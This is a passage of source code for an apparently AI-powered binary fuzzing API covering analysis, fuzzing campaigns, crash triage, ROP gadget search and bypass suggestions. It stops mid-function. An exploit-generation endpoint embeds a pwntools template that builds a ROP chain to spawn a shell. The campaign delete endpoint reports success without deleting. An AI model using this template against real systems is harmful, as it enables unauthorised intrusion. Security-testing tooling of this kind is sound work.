"""
Agentic Binary Fuzzer API Router

REST API endpoints for the AI-powered autonomous binary fuzzing system.
"""

import asyncio
import base64
import logging
import threading
from datetime import timedelta
from typing import Any, Dict, List, Optional
from fastapi import APIRouter, File, UploadFile, HTTPException, BackgroundTasks, Query, Depends
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, Field
import json

from backend.services.agentic_binary_fuzzer import (
    AgenticBinaryFuzzer,
    AgenticFuzzerConfig,
    QuickAnalysisResult,
    FullAnalysisResult,
)
from backend.services.binary_ai_reasoning import (
    FuzzingStrategy,
    ExploitabilityScore,
    SecurityFeatures,
)
from backend.core.auth import get_current_active_user
from backend.models.models import User

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/agentic-binary", tags=["Agentic Binary Fuzzer"])

# Global fuzzer instance with thread-safe initialization
_fuzzer: Optional[AgenticBinaryFuzzer] = None
_fuzzer_lock = threading.Lock()


def get_fuzzer() -> AgenticBinaryFuzzer:
    """
    Get or create the global fuzzer instance.

    Thread-safe initialization to prevent race conditions when multiple
    users start fuzzing campaigns simultaneously.
    """
    global _fuzzer
    if _fuzzer is None:
        with _fuzzer_lock:
            # Double-check pattern - re-check inside lock
            if _fuzzer is None:
                logger.info("Initializing AgenticBinaryFuzzer instance")
                _fuzzer = AgenticBinaryFuzzer()
    return _fuzzer


# =============================================================================
# Request/Response Models
# =============================================================================

class CampaignStartRequest(BaseModel):
    """Request to start a fuzzing campaign."""
    binary_base64: Optional[str] = Field(None, description="Base64-encoded binary data")
    binary_name: str = Field("target", description="Name for the binary")
    max_duration_hours: int = Field(2, description="Maximum campaign duration in hours (default: 2)")
    strategy: Optional[str] = Field(None, description="Initial fuzzing strategy")
    max_engines: int = Field(4, description="Maximum number of fuzzing engines")
    target_coverage: Optional[float] = Field(None, description="Target coverage percentage")
    stop_on_exploitable: bool = Field(False, description="Stop when exploitable crash found")
    enable_ai: bool = Field(True, description="Enable AI decision making")


class CampaignStatusResponse(BaseModel):
    """Response with campaign status."""
    campaign_id: str
    status: str
    elapsed_time: Optional[str] = None
    total_executions: int = 0
    coverage_percentage: float = 0.0
    unique_crashes: int = 0
    exploitable_crashes: int = 0
    corpus_size: int = 0
    executions_per_second: float = 0.0
    current_strategy: Optional[str] = None
    decisions_made: int = 0


class CrashTriageRequest(BaseModel):
    """Request to triage a crash."""
    crash_data_base64: str = Field(..., description="Base64-encoded crash input")
    crash_address: Optional[int] = Field(None, description="Crash address")
    instruction: Optional[str] = Field(None, description="Crashing instruction")
    access_type: Optional[str] = Field(None, description="Memory access type")
    registers: Optional[Dict[str, int]] = Field(None, description="Register state")


class CrashTriageResponse(BaseModel):
    """Response with crash triage result."""
    crash_id: str
    crash_type: str
    exploitability: str
    confidence: float
    root_cause: Optional[str] = None
    primitives: List[str] = []
    ai_reasoning: Optional[str] = None


class ExploitGenerateRequest(BaseModel):
    """Request to generate an exploit."""
    crash_id: str
    binary_base64: Optional[str] = Field(None, description="Binary data for gadget finding")
    binary_name: str = Field("target", description="Name of the target binary")
    vuln_type: str = Field("buffer_overflow", description="Vulnerability type")
    architecture: str = Field("x64", description="Target architecture (x86, x64, arm, arm64)")
    offset: Optional[int] = Field(None, description="Offset to return address if known")


class ExploitGenerateResponse(BaseModel):
    """Response with generated exploit."""
    technique: str
    steps: List[str]
    skeleton_code: str
    bypass_suggestions: List[Dict[str, Any]]
    gadgets_found: int
    confidence: float


class SeedGenerateRequest(BaseModel):
    """Request to generate fuzzing seeds."""
    binary_base64: str = Field(..., description="Base64-encoded binary data")
    count: int = Field(10, description="Number of seeds to generate")
    format_hint: Optional[str] = Field(None, description="Expected input format hint")


class SeedGenerateResponse(BaseModel):
    """Response with generated seeds."""
    seeds: List[Dict[str, Any]]
    dictionary_entries: List[str]
    detected_format: Optional[str] = None


class EnvironmentStatusResponse(BaseModel):
    """Response with fuzzing environment status."""
    afl_available: bool
    afl_version: Optional[str] = None
    mock_mode: bool
    warning: Optional[str] = None
    ai_enabled: bool
    decision_interval_seconds: int
    estimated_ai_calls_per_hour: int


class QuickAnalysisResponse(BaseModel):
    """Response with quick analysis result."""
    binary_name: str
    file_type: str
    architecture: str
    size_bytes: int
    hash: str
    protections: Dict[str, bool]
    attack_surface_score: float
    recommended_strategy: str
    estimated_difficulty: str
    dangerous_functions: List[str]
    input_handlers: List[str]
    interesting_strings: List[str]
    ai_recommendation: str


class FullAnalysisResponse(BaseModel):
    """Response with full analysis result."""
    binary_name: str
    file_type: str
    architecture: str
    protections: Dict[str, Any]
    attack_surface_score: float
    function_count: int
    vulnerability_hints: List[Dict[str, Any]]
    attack_vectors: List[Dict[str, Any]]
    seed_suggestions: List[Dict[str, Any]]
    campaign_plan: Optional[Dict[str, Any]] = None


class GadgetFindRequest(BaseModel):
    """Request to find ROP gadgets."""
    binary_base64: str = Field(..., description="Base64-encoded binary data")
    architecture: str = Field("x64", description="Target architecture")
    max_gadgets: int = Field(100, description="Maximum gadgets to return")


class GadgetResponse(BaseModel):
    """Response with found gadgets."""
    address: int
    instructions: str
    gadget_type: str
    category: Optional[str] = None
    controllable_regs: List[str]
    quality_score: float


class BypassSuggestRequest(BaseModel):
    """Request for bypass suggestions."""
    protections: Dict[str, Any]
    primitives: List[str]


class BypassSuggestResponse(BaseModel):
    """Response with bypass suggestions."""
    bypasses: List[Dict[str, Any]]


# =============================================================================
# Environment Status Endpoint
# =============================================================================

@router.get("/environment", response_model=EnvironmentStatusResponse)
async def get_environment_status(current_user: User = Depends(get_current_active_user)):
    """
    Check fuzzing environment status.

    Returns whether AFL++ is available, if running in mock mode,
    and estimated AI call costs.
    """
    import shutil
    import subprocess

    fuzzer = get_fuzzer()
    config = fuzzer.config

    # Check AFL++ availability
    afl_path = shutil.which("afl-fuzz")
    afl_available = afl_path is not None
    afl_version = None

    if afl_available:
        try:
            result = subprocess.run(
                ["afl-fuzz", "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            # AFL++ outputs version to stderr
            version_output = result.stderr or result.stdout
            if version_output:
                afl_version = version_output.strip().split('\n')[0][:50]
        except Exception:
            afl_version = "unknown"

    # Determine if we'd run in mock mode
    mock_mode = not afl_available

    # Calculate AI calls estimate
    decision_interval = config.decision_interval
    ai_calls_per_hour = (3600 // decision_interval) if config.enable_ai else 0

    # Generate warning if needed
    warning = None
    if mock_mode:
        warning = "AFL++ not found! Fuzzing will run in MOCK MODE (simulated only, no real vulnerability discovery). Install AFL++ for real fuzzing."

    return EnvironmentStatusResponse(
        afl_available=afl_available,
        afl_version=afl_version,
        mock_mode=mock_mode,
        warning=warning,
        ai_enabled=config.enable_ai,
        decision_interval_seconds=decision_interval,
        estimated_ai_calls_per_hour=ai_calls_per_hour,
    )


# =============================================================================
# Analysis Endpoints
# =============================================================================

@router.post("/analyze/quick", response_model=QuickAnalysisResponse)
async def quick_analyze(file: UploadFile = File(...), current_user: User = Depends(get_current_active_user)):
    """
    Perform quick analysis of a binary file.

    This is a lightweight analysis suitable for initial assessment
    before starting a full fuzzing campaign.
    """
    try:
        fuzzer = get_fuzzer()
        binary_data = await file.read()

        result = await fuzzer.quick_analyze(binary_data, file.filename or "binary")

        return QuickAnalysisResponse(
            binary_name=result.binary_name,
            file_type=result.file_type,
            architecture=result.architecture,
            size_bytes=result.size_bytes,
            hash=result.hash,
            protections=result.protections,
            attack_surface_score=result.attack_surface_score,
            recommended_strategy=result.recommended_strategy.value,
            estimated_difficulty=result.estimated_difficulty,
            dangerous_functions=result.dangerous_functions,
            input_handlers=result.input_handlers,
            interesting_strings=result.interesting_strings,
            ai_recommendation=result.ai_recommendation,
        )
    except Exception as e:
        logger.error(f"Quick analysis failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/analyze/full", response_model=FullAnalysisResponse)
async def full_analyze(file: UploadFile = File(...), current_user: User = Depends(get_current_active_user)):
    """
    Perform comprehensive analysis of a binary file.

    This includes deep static analysis, AI enhancement, and campaign planning.
    """
    try:
        fuzzer = get_fuzzer()
        binary_data = await file.read()

        result = await fuzzer.full_analyze(binary_data, file.filename or "binary")

        return FullAnalysisResponse(
            binary_name=result.profile.file_name,
            file_type=result.profile.file_type,
            architecture=result.profile.architecture,
            protections={
                "aslr": result.profile.protections.aslr,
                "dep": result.profile.protections.dep,
                "stack_canary": result.profile.protections.stack_canary,
                "pie": result.profile.protections.pie,
                "relro": result.profile.protections.relro,
            },
            attack_surface_score=result.profile.attack_surface_score,
            function_count=len(result.profile.functions),
            vulnerability_hints=result.vulnerability_hints,
            attack_vectors=result.attack_vectors,
            seed_suggestions=result.seed_suggestions,
            campaign_plan={
                "strategy": result.campaign_plan.initial_strategy.value,
                "checkpoints": len(result.campaign_plan.checkpoints),
            } if result.campaign_plan else None,
        )
    except Exception as e:
        logger.error(f"Full analysis failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# =============================================================================
# Campaign Endpoints
# =============================================================================

@router.post("/campaigns", response_model=Dict[str, Any])
async def start_campaign(
    request: CampaignStartRequest,
    background_tasks: BackgroundTasks,
    file: Optional[UploadFile] = File(None),
    current_user: User = Depends(get_current_active_user),
):
    """
    Start a new autonomous fuzzing campaign.

    Returns the campaign ID for tracking, plus warnings if environment issues exist.
    """
    import shutil

    try:
        fuzzer = get_fuzzer()

        # Check AFL++ availability and warn if not present
        afl_available = shutil.which("afl-fuzz") is not None
        mock_mode_warning = None
        if not afl_available:
            mock_mode_warning = (
                "WARNING: AFL++ not found! Running in MOCK MODE - "
                "this will simulate fuzzing but NOT find real vulnerabilities. "
                "Install AFL++ for actual security testing."
            )
            logger.warning(mock_mode_warning)

        # Get binary data from file or base64
        if file:
            binary_data = await file.read()
            binary_name = file.filename or "target"
        elif request.binary_base64:
            binary_data = base64.b64decode(request.binary_base64)
            binary_name = request.binary_name
        else:
            raise HTTPException(
                status_code=400,
                detail="Either file upload or binary_base64 required",
            )

        # Build config
        config = {
            "max_duration_hours": request.max_duration_hours,
            "max_engines": request.max_engines,
            "stop_on_exploitable": request.stop_on_exploitable,
        }

        if request.strategy:
            config["strategy"] = request.strategy
        if request.target_coverage:
            config["target_coverage"] = request.target_coverage

        # Start campaign
        campaign_id = await fuzzer.start_campaign(
            binary_data,
            binary_name,
            config=config,
        )

        response = {
            "campaign_id": campaign_id,
            "mock_mode": not afl_available,
        }
        if mock_mode_warning:
            response["warning"] = mock_mode_warning

        return response

    except Exception as e:
        logger.error(f"Failed to start campaign: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/campaigns", response_model=List[Dict[str, Any]])
async def list_campaigns(current_user: User = Depends(get_current_active_user)):
    """List all fuzzing campaigns."""
    fuzzer = get_fuzzer()
    return fuzzer.list_campaigns()


@router.get("/campaigns/{campaign_id}", response_model=CampaignStatusResponse)
async def get_campaign_status(campaign_id: str, current_user: User = Depends(get_current_active_user)):
    """Get current status of a campaign."""
    fuzzer = get_fuzzer()
    status = fuzzer.get_campaign_status(campaign_id)

    if not status:
        raise HTTPException(status_code=404, detail="Campaign not found")

    return CampaignStatusResponse(**status)


@router.post("/campaigns/{campaign_id}/pause")
async def pause_campaign(campaign_id: str, current_user: User = Depends(get_current_active_user)):
    """Pause a running campaign."""
    fuzzer = get_fuzzer()
    success = await fuzzer.pause_campaign(campaign_id)

    if not success:
        raise HTTPException(status_code=400, detail="Cannot pause campaign")

    return {"status": "paused"}


@router.post("/campaigns/{campaign_id}/resume")
async def resume_campaign(campaign_id: str, current_user: User = Depends(get_current_active_user)):
    """Resume a paused campaign."""
    fuzzer = get_fuzzer()
    success = await fuzzer.resume_campaign(campaign_id)

    if not success:
        raise HTTPException(status_code=400, detail="Cannot resume campaign")

    return {"status": "resumed"}


@router.post("/campaigns/{campaign_id}/stop")
async def stop_campaign(
    campaign_id: str,
    background_tasks: BackgroundTasks,
    current_user: User = Depends(get_current_active_user),
):
    """
    Stop a campaign and automatically generate a report.

    The report will be generated in the background and saved for later viewing.
    """
    fuzzer = get_fuzzer()
    success = await fuzzer.stop_campaign(campaign_id)

    if not success:
        raise HTTPException(status_code=400, detail="Cannot stop campaign")

    # Automatically generate report when campaign stops
    background_tasks.add_task(
        _generate_and_save_report,
        campaign_id,
        current_user.id,
    )

    return {"status": "stopping", "report_generating": True}


@router.delete("/campaigns/{campaign_id}")
async def delete_campaign(campaign_id: str, current_user: User = Depends(get_current_active_user)):
    """Delete a completed campaign."""
    fuzzer = get_fuzzer()
    status = fuzzer.get_campaign_status(campaign_id)

    if not status:
        raise HTTPException(status_code=404, detail="Campaign not found")

    if status.get("status") not in ["completed", "failed"]:
        raise HTTPException(status_code=400, detail="Can only delete completed campaigns")

    # Delete logic would go here
    return {"status": "deleted"}


@router.get("/campaigns/{campaign_id}/decisions", response_model=List[Dict[str, Any]])
async def get_campaign_decisions(campaign_id: str, current_user: User = Depends(get_current_active_user)):
    """Get all AI decisions made during a campaign."""
    fuzzer = get_fuzzer()
    decisions = fuzzer.get_campaign_decisions(campaign_id)
    return decisions


@router.get("/campaigns/{campaign_id}/crashes", response_model=List[Dict[str, Any]])
async def get_campaign_crashes(campaign_id: str, current_user: User = Depends(get_current_active_user)):
    """Get all crashes found during a campaign."""
    fuzzer = get_fuzzer()
    crashes = fuzzer.get_campaign_crashes(campaign_id)
    return crashes


@router.get("/campaigns/{campaign_id}/result")
async def get_campaign_result(campaign_id: str, current_user: User = Depends(get_current_active_user)):
    """Get final result of a completed campaign."""
    fuzzer = get_fuzzer()
    result = await fuzzer.get_campaign_result(campaign_id)

    if not result:
        raise HTTPException(
            status_code=404,
            detail="Campaign not found or not completed",
        )

    return {
        "campaign_id": result.campaign_id,
        "binary_name": result.binary_name,
        "status": result.status.value,
        "duration": str(result.duration),
        "total_executions": result.total_executions,
        "final_coverage": result.final_coverage,
        "unique_crashes": result.unique_crashes,
        "exploitable_crashes": result.exploitable_crashes,
        "total_decisions": result.total_decisions,
        "strategy_changes": result.strategy_changes,
        "decisions_by_type": result.decisions_by_type,
    }


# =============================================================================
# Crash Analysis Endpoints
# =============================================================================

@router.post("/triage", response_model=CrashTriageResponse)
async def triage_crash(request: CrashTriageRequest, current_user: User = Depends(get_current_active_user)):
    """
    Analyze a crash and assess its exploitability.
    """
    try:
        fuzzer = get_fuzzer()
        crash_data = base64.b64decode(request.crash_data_base64)

        context = {
            "crash_address": request.crash_address,
            "instruction": request.instruction,
            "access_type": request.access_type,
            "registers": request.registers,
        }

        result = await fuzzer.triage_crash(crash_data, crash_context=context)

        return CrashTriageResponse(
            crash_id=result.crash_id,
            crash_type=result.crash_type,
            exploitability=result.exploitability.value,
            confidence=result.confidence,
            root_cause=result.root_cause.description if result.root_cause else None,
            primitives=[p.primitive.value for p in result.primitives] if result.primitives else [],
            ai_reasoning=result.ai_reasoning,
        )

    except Exception as e:
        logger.error(f"Crash triage failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/campaigns/{campaign_id}/crashes/{crash_id}/triage")
async def triage_campaign_crash(campaign_id: str, crash_id: str, current_user: User = Depends(get_current_active_user)):
    """Re-triage a specific crash from a campaign."""
    fuzzer = get_fuzzer()
    crashes = fuzzer.get_campaign_crashes(campaign_id)

    crash = next((c for c in crashes if c.get("id") == crash_id), None)
    if not crash:
        raise HTTPException(status_code=404, detail="Crash not found")

    # Triage the crash
    result = await fuzzer.triage_crash(crash.get("data", b""))

    return {
        "crash_id": crash_id,
        "triage_result": {
            "crash_type": result.crash_type,
            "exploitability": result.exploitability.value,
            "confidence": result.confidence,
        },
    }


# =============================================================================
# Exploit Generation Endpoints
# =============================================================================

@router.post("/exploit/generate", response_model=ExploitGenerateResponse)
async def generate_exploit(request: ExploitGenerateRequest, current_user: User = Depends(get_current_active_user)):
    """
    Generate an exploit skeleton for a triaged crash.
    """
    try:
        fuzzer = get_fuzzer()

        # Get binary data if provided
        binary_data = None
        if request.binary_base64:
            binary_data = base64.b64decode(request.binary_base64)

        # Generate complete exploit skeleton based on vulnerability type
        skeleton_code = f'''#!/usr/bin/env python3
"""
Exploit for {request.binary_name}
Generated by VRAgent Agentic Binary Analyzer

Vulnerability: {request.vuln_type}
Architecture: {request.architecture}
"""

from pwn import *

# Configuration
BINARY = "./{request.binary_name}"
HOST = "localhost"
PORT = 9999

# Load binary
elf = ELF(BINARY)
context.binary = elf
context.arch = "{request.architecture}"
context.log_level = "info"

def start():
    """Start process or connect to remote."""
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BINARY)

def exploit():
    """Main exploit logic."""
    io = start()

    # Step 1: Leak address to defeat ASLR (if needed)
    # io.sendline(b"%p." * 10)
    # leak = io.recvline()
    # base_addr = parse_leak(leak)

    # Step 2: Build ROP chain
    rop = ROP(elf)
    binsh = next(elf.search(b"/bin/sh\\x00"))

    # Method 1: Use system()
    if "system" in elf.plt:
        rop.system(binsh)
    # Method 2: Use execve syscall
    else:
        rop.execve(binsh, 0, 0)

    # Step 3: Construct payload
    offset = {request.offset if request.offset is not None else 'CALCULATE_OFFSET'}
    payload = b"A" * offset
    payload += rop.chain()

    # Step 4: Trigger overflow and get shell
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

        return ExploitGenerateResponse(
            technique="rop_chain",
            steps=[
                "1. Leak address to defeat ASLR (if protections enabled)",
                "2. Build ROP chain using system() or execve syscall",
                "3. Calculate offset to return address",
                "4. Construct payload: padding + ROP chain",
                "5. Trigger vulnerability and get shell",
            ],
            skeleton_code=skeleton_code,
            bypass_suggestions=[
                "Use ROP if NX/DEP enabled",
                "Leak address if ASLR/PIE enabled",
                "Leak or brute-force canary if stack canary present",
            ],
            gadgets_found=0,  # Would be populated by actual gadget search
            confidence=0.7,  # Higher confidence with complete template
        )

    except Exception as e:
        logger.error(f"Exploit generation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/gadgets", response_model=List[GadgetResponse])
async def find_gadgets(request: GadgetFindRequest, current_user: User = Depends(get_current_active_user)):
    """
    Find ROP gadgets in a binary.
    """
    try:
        fuzzer = get_fuzzer()
        binary_data = base64.b64decode(request.binary_base64)

        gadgets = await fuzzer.find_gadgets(binary_data, request.architecture)

        return [
            GadgetResponse(
                address=g.address,
                instructions=g.instructions,
                gadget_type=g.gadget_type.value,
                category=g.category,
                controllable_regs=g.controllable_regs,
                quality_score=g.quality_score,
            )
            for g in gadgets[:request.max_gadgets]
        ]

    except Exception as e:
        logger.error(f"Gadget finding failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/bypasses", response_model=BypassSuggestResponse)
async def suggest_bypasses(request: BypassSuggestRequest, current_user: User = Depends(get_current_active_user)):
    """
    Suggest bypass strategies for security mitigations.
    """
    try:
        fuzzer = get_fuzzer()

        # Build SecurityFeatures from request
        protections = SecurityFeatures(
            aslr=request.protections.get("aslr", True),
            dep=request.protections.get("dep", True),
            stack_canary=request.protections.get("stack_canary", False),
            pie=request.protections.get("pie", False),
            relro=request.protections.get("relro", "none"),
        )

        bypasses = await fuzzer.suggest_bypasses(protections, request.primitives)

        return BypassSuggestResponse(
            bypasses=[
                {
                    "mitigation": b.mitigation,
                    "technique": b.technique,
                    "description": b.description,
                    "requirements": b.requirements,
                    "success_probability": b.success_probability,
                    "example_code": b.example_code,
                }
                for b in bypasses
            ]
        )

    except Exception as e:
        logger.error(f"Bypass suggestion failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# =============================================================================
# Seed Generation Endpoints
# =============================================================================

@router.post("/seeds/generate", response_model=SeedGenerateResponse)
async def generate_seeds(request: SeedGenerateRequest, current_user: User = Depends(get_current_active_user)):
    """
    Generate intelligent fuzzing seeds for a binary.
    """
    try:
        fuzzer = get_fuzzer()
        binary_data = base64.b64decode(request.binary_base64)

        # Get binary profile first
        profile = await fuzzer.binary_analyzer.analyze(binary_data, "target")

        # Generate seeds
        result = await fuzzer.generate_seeds(
            profile,
            count=request.count,
            format_hint=request.format_hint,
        )

        # Generate dictionary
        dict_entries = await fuzzer.generate_dictionary(profile)

        return SeedGenerateResponse(
            seeds=[
                {
                    "data": base64.b64encode(s.data).decode(),
                    "name": s.name,
                    "rationale": s.rationale,
                    "expected_path": s.expected_path,
                }
                for s in result.seeds
            ],
            dictionary_entries=[base64.b64encode(e).decode() for e in dict_entries],
            detected_format=result.detected_format,
        )

    except Exception as e:
        logger.error(f"Seed generation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# =============================================================================
# Statistics Endpoints
# =============================================================================

@router.get("/stats")
async def get_stats(current_user: User = Depends(get_current_active_user)):
    """Get overall fuzzer statistics."""
    fuzzer = get_fuzzer()
    return fuzzer.get_stats()


# =============================================================================
# WebSocket for Real-time Updates
# =============================================================================

@router.websocket("/campaigns/{campaign_id}/ws")
async def campaign_websocket(websocket, campaign_id: str):
    """
    WebSocket endpoint for real-time campaign updates.
    """
    from fastapi import WebSocket

    await websocket.accept()

    fuzzer = get_fuzzer()

    try:
        async for event in fuzzer.stream_events(campaign_id):
            await websocket.send_json({
                "event_type": event.event_type,
                "campaign_id": event.campaign_id,
                "timestamp": event.timestamp.isoformat(),
                "data": event.data,
            })
    except Exception as e:
        logger.error(f"WebSocket error: {e}")
    finally:
        await websocket.close()


# =============================================================================
# Server-Sent Events Alternative
# =============================================================================

@router.get("/campaigns/{campaign_id}/events")
async def campaign_events(campaign_id: str, current_user: User = Depends(get_current_active_user)):
    """
    Server-Sent Events endpoint for real-time campaign updates.

    Alternative to WebSocket for clients that prefer SSE.
    """
    fuzzer = get_fuzzer()

    async def event_generator():
        async for event in fuzzer.stream_events(campaign_id):
            data = json.dumps({
                "event_type": event.event_type,
                "campaign_id": event.campaign_id,
                "timestamp": event.timestamp.isoformat(),
                "data": event.data,
            })
            yield f"data: {data}\n\n"

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
    )


# =============================================================================
# Campaign Reports
# =============================================================================

class ReportListItem(BaseModel):
    """Summary of a saved report."""
    id: int
    campaign_id: str
    binary_name: str
    status: str
    risk_rating: Optional[str] = None
    final_coverage: Optional[float] = None
    unique_crashes: int = 0
    exploitable_crashes: int = 0
    duration_seconds: Optional[int] = None
    created_at: str


class ReportDetailResponse(BaseModel):
    """Full report details."""
    id: int
    campaign_id: str
    binary_name: str
    binary_hash: Optional[str] = None
    binary_type: Optional[str] = None
    architecture: Optional[str] = None
    status: str
    started_at: Optional[str] = None
    completed_at: Optional[str] = None
    duration_seconds: Optional[int] = None
    total_executions: int = 0
    executions_per_second: Optional[float] = None
    final_coverage: Optional[float] = None
    unique_crashes: int = 0
    exploitable_crashes: int = 0
    total_decisions: int = 0
    executive_summary: Optional[str] = None
    findings_summary: Optional[str] = None
    recommendations: Optional[str] = None
    report_data: Optional[Dict[str, Any]] = None
    decisions: Optional[List[Dict[str, Any]]] = None
    crashes: Optional[List[Dict[str, Any]]] = None
    created_at: str


@router.get("/reports", response_model=List[ReportListItem])
async def list_reports(
    skip: int = Query(0, ge=0),
    limit: int = Query(50, ge=1, le=100),
    current_user: User = Depends(get_current_active_user),
):
    """
    List all saved fuzzing campaign reports.

    Returns a paginated list of reports, sorted by creation date (newest first).
    """
    from sqlalchemy import select, desc
    from backend.core.database import async_session_maker
    from backend.models.models import FuzzingCampaignReport

    async with async_session_maker() as session:
        query = (
            select(FuzzingCampaignReport)
            .where(FuzzingCampaignReport.user_id == current_user.id)
            .order_by(desc(FuzzingCampaignReport.created_at))
            .offset(skip)
            .limit(limit)
        )
        result = await session.execute(query)
        reports = result.scalars().all()

        return [
            ReportListItem(
                id=r.id,
                campaign_id=r.campaign_id,
                binary_name=r.binary_name,
                status=r.status,
                risk_rating=r.report_data.get("risk_rating") if r.report_data else None,
                final_coverage=r.final_coverage,
                unique_crashes=r.unique_crashes or 0,
                exploitable_crashes=r.exploitable_crashes or 0,
                duration_seconds=r.duration_seconds,
                created_at=r.created_at.isoformat() if r.created_at else "",
            )
            for r in reports
        ]


@router.get("/reports/{campaign_id}", response_model=ReportDetailResponse)
async def get_report(
    campaign_id: str,
    current_user: User = Depends(get_current_active_user),
):
    """
    Get a saved report by campaign ID.
    """
    from sqlalchemy import select
    from backend.core.database import async_session_maker
    from backend.models.models import FuzzingCampaignReport

    async with async_session_maker() as session:
        query = select(FuzzingCampaignReport).where(
            FuzzingCampaignReport.campaign_id == campaign_id,
            FuzzingCampaignReport.user_id == current_user.id,
        )
        result = await session.execute(query)
        report = result.scalar_one_or_none()

        if not report:
            raise HTTPException(status_code=404, detail="Report not found")

        return ReportDetailResponse(
            id=report.id,
            campaign_id=report.campaign_id,
            binary_name=report.binary_name,
            binary_hash=report.binary_hash,
            binary_type=report.binary_type,
            architecture=report.architecture,
            status=report.status,
            started_at=report.started_at.isoformat() if report.started_at else None,
            completed_at=report.completed_at.isoformat() if report.completed_at else None,
            duration_seconds=report.duration_seconds,
            total_executions=report.total_executions or 0,
            executions_per_second=report.executions_per_second,
            final_coverage=report.final_coverage,
            unique_crashes=report.unique_crashes or 0,
            exploitable_crashes=report.exploitable_crashes or 0,
            total_decisions=report.total_decisions or 0,
            executive_summary=report.executive_summary,
            findings_summary=report.findings_summary,
            recommendations=report.recommendations,
            report_data=report.report_data,
            decisions=report.decisions,
            crashes=report.crashes,
            created_at=report.created_at.isoformat() if report.created_at else "",
        )


@router.get("/reports/{campaign_id}/export/{format}")
async def export_report(
    campaign_id: str,
    format: str,
    current_user: User = Depends(get_current_active_user),
):
    """
    Export a report in the specified format.

    Supported formats:
    - md: Markdown
    - pdf: PDF document
    - docx: Microsoft Word document
    """
    from sqlalchemy import select
    from backend.core.database import async_session_maker
    from backend.models.models import FuzzingCampaignReport
    from backend.services.fuzzing_report_service import (
        export_to_markdown,
        export_to_pdf,
        export_to_docx,
    )

    format = format.lower()
    if format not in ["md", "pdf", "docx"]:
        raise HTTPException(
            status_code=400,
            detail=f"Unsupported format: {format}. Use 'md', 'pdf', or 'docx'."
        )

    async with async_session_maker() as session:
        query = select(FuzzingCampaignReport).where(
            FuzzingCampaignReport.campaign_id == campaign_id,
            FuzzingCampaignReport.user_id == current_user.id,
        )
        result = await session.execute(query)
        report = result.scalar_one_or_none()

        if not report:
            raise HTTPException(status_code=404, detail="Report not found")

        if not report.markdown_report:
            raise HTTPException(status_code=400, detail="Report content not available")

        # Generate export
        filename = f"fuzzing_report_{campaign_id}"

        if format == "md":
            content = export_to_markdown(report.markdown_report)
            media_type = "text/markdown"
            filename += ".md"
        elif format == "pdf":
            content = export_to_pdf(report.markdown_report, f"Fuzzing Report: {report.binary_name}")
            media_type = "application/pdf"
            filename += ".pdf"
        elif format == "docx":
            content = export_to_docx(report.markdown_report, f"Fuzzing Report: {report.binary_name}")
            media_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            filename += ".docx"

        return StreamingResponse(
            iter([content]),
            media_type=media_type,
            headers={
                "Content-Disposition": f'attachment; filename="{filename}"',
                "Content-Length": str(len(content)),
            }
        )


@router.delete("/reports/{campaign_id}")
async def delete_report(
    campaign_id: str,
    current_user: User = Depends(get_current_active_user),
):
    """Delete a saved report."""
    from sqlalchemy import select, delete
    from backend.core.database import async_session_maker
    from backend.models.models import FuzzingCampaignReport

    async with async_session_maker() as session:
        query = delete(FuzzingCampaignReport).where(
            FuzzingCampaignReport.campaign_id == campaign_id,
            FuzzingCampaignReport.user_id == current_user.id,
        )
        result = await session.execute(query)
        await session.commit()

        if result.rowcount == 0:
            raise HTTPException(status_code=404, detail="Report not found")

        return {"status": "deleted"}


@router.post("/campaigns/{campaign_id}/generate-report")
async def generate_campaign_report(
    campaign_id: str,
    background_tasks: BackgroundTasks,
    current_user: User = Depends(get_current_active_user),
):
    """
    Generate and save a report for a completed campaign.

    This is automatically called when a campaign completes, but can also
    be triggered manually.
    """
    fuzzer = get_fuzzer()
    status = fuzzer.get_campaign_status(campaign_id)

    if not status:
        raise HTTPException(status_code=404, detail="Campaign not found")

    # Allow report generation for completed, failed, or stopped campaigns
    if status.get("status") not in ["completed", "failed", "stopping", "stopped"]:
        raise HTTPException(
            status_code=400,
            detail="Can only generate reports for completed campaigns"
        )

    # Generate report in background
    background_tasks.add_task(
        _generate_and_save_report,
        campaign_id,
        current_user.id,
    )

    return {"status": "generating", "message": "Report generation started"}


async def _generate_and_save_report(campaign_id: str, user_id: int):
    """Background task to generate and save a campaign report."""
    from datetime import datetime
    from backend.core.database import async_session_maker
    from backend.models.models import FuzzingCampaignReport
    from backend.services.fuzzing_report_service import FuzzingReportGenerator

    logger.info(f"Generating report for campaign {campaign_id}")

    try:
        fuzzer = get_fuzzer()

        # Get campaign data
        status = fuzzer.get_campaign_status(campaign_id)
        if not status:
            logger.error(f"Campaign {campaign_id} not found")
            return

        crashes = fuzzer.get_campaign_crashes(campaign_id)
        decisions = fuzzer.get_campaign_decisions(campaign_id)

        # Extract timing info
        started_at = status.get("started_at")
        if isinstance(started_at, str):
            started_at = datetime.fromisoformat(started_at.replace("Z", "+00:00"))
        elif not isinstance(started_at, datetime):
            started_at = datetime.utcnow()

        completed_at = status.get("completed_at") or status.get("ended_at")
        if isinstance(completed_at, str):
            completed_at = datetime.fromisoformat(completed_at.replace("Z", "+00:00"))
        elif not isinstance(completed_at, datetime):
            completed_at = datetime.utcnow()

        # Generate the report
        generator = FuzzingReportGenerator(ai_client=fuzzer.ai_client)
        report_data, markdown_report = await generator.generate_report(
            campaign_id=campaign_id,
            binary_name=status.get("binary_name", "unknown"),
            binary_hash=status.get("binary_hash", ""),
            binary_type=status.get("binary_type", "unknown"),
            architecture=status.get("architecture", "unknown"),
            started_at=started_at,
            completed_at=completed_at,
            total_executions=status.get("total_executions", 0),
            executions_per_second=status.get("executions_per_second", 0.0),
            final_coverage=status.get("coverage_percentage", 0.0),
